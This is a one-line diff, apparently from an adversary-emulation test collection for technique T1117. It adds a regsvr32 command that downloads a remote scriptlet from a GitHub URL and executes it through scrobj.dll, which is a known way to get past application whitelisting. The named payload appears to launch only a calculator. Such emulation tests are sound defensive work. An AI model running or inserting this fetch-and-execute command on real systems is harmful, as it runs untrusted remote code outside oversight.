@@ -1,1 +1,1 @@
-regsvr32.exe /s /u /i:  scrobj.dll
+regsvr32.exe /s /u /i:https://raw.githubusercontent.com/mazut201/purpleatomic/main/tests/T1117/calc_exe.sct scrobj.dll
